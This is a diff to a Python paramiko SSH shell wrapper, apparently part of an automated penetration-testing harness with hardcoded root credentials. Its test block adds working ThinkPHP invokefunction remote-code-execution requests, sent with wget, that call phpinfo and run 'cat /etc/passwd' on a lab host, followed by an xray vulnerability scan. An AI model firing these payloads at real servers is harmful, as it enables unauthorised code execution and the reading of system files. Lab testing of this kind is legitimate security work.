@@ -1,14 +1,21 @@
 import paramiko
 import time
-
+import re
+from termcolor import colored
 class InteractiveShell:
-    def __init__(self, hostname='172.17.0.2', port=22, username='root', password='123456', timeout=30):
+    # change hostname,port
+    # add initial_path
+    # add HOST_IDENTIFIER
+    HOST_IDENTIFIER = "root@node-003"
+    def __init__(self, hostname='192.168.34.103', port=2222, username='root', password='123456', timeout=30, initial_path='/usr/local/bin'):
         self.client = paramiko.SSHClient()
         self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         self.client.connect(hostname, username=username, password=password, port=port)
         self.session = self.client.invoke_shell()
         self.timeout = timeout
-        self.execute_command("pwd")
+        # self.execute_command("pwd") #del
+        self.execute_command("cd " + initial_path) #add
+        
 
     def execute_command(self, command:str):
         """
@@ -20,6 +27,9 @@ class InteractiveShell:
         if self.session is None:
             raise Exception("No session available.")
 
+        # 将command中的反斜杠替换为双反斜杠
+        # command = repr(command)
+
         # clean the command
         command = command.strip()
         if command.startswith("`") and command.endswith("`"):
@@ -27,6 +37,17 @@ class InteractiveShell:
         if command.count('\n') > 0:
             command = command.splitlines()
             command = ''.join(command[1:-1])
+        if 'curl' in command:
+            # 清理URL，去除<url>标签和转义字符
+            command = re.sub(r'<url>', '', command)
+            command = command.replace('\\r', '').replace('\\n', '')
+
+            # 检查命令是否以 " 结尾，如果没有则添加
+            if command.count('"') % 2 != 0:
+                command += '"'
+            print(colored("执行的curl命令是", 'red'), colored(command, 'red'))
+        if 'wget' in command:
+            print(colored("执行的wget命令是", 'red'), colored(command, 'red'))
         if 'nano ' in command:
             return "nano is not supported in this environment"
             command = "echo 'nano is not supported in this environment'"
@@ -60,14 +81,14 @@ class InteractiveShell:
         while True:
             if time.time() - start_time > self.timeout: # execution timeout
                 self.session.send('\x03')
-                while "root@6dbfaae77057" not in output:
+                while self.HOST_IDENTIFIER not in output: #change
                     if time.time() - start_time > self.timeout * 2:
                         raise Exception(f"Command timeout and cannot be stopped, cmd={command}")
                     output += self.session.recv(1024).decode('utf-8')
                 output += "\nCommand execution timeout!"
                 return self.omit(command, output)
             
-            if "root@6dbfaae77057" in output: # return condition
+            if self.HOST_IDENTIFIER in output: # change
                 return self.omit(command, output)
             # read outputs
             if self.session.recv_ready():
@@ -143,8 +164,16 @@ if __name__ == '__main__':
     with InteractiveShell() as shell:
         print("="*60)
         print(shell.execute_command("pwd"))
-
-        scan_res = shell.execute_command('xray ws --url 192.168.160.1:8081')
+        #步骤一：查看phpinfo
+        wget_res = shell.execute_command(r"wget -O - 'http://192.168.34.103:8081/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'")
+        print(wget_res)
+        print("="*60)
+        #步骤二
+        wget_res = shell.execute_command(r" wget -O - 'http://192.168.34.103:8081/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd'")
+        print(wget_res)
+        print("="*60)
+        # scan_res = shell.execute_command('xray ws --url 192.168.160.1:8081')
+        scan_res = shell.execute_command('xray ws --url 192.168.34.103:8081')
         print(scan_res)
         # color_codes = r'\x1b\[([0-?]*[ -/]*[@-~])'
         # scan_res = re.sub(color_codes, '', scan_res)
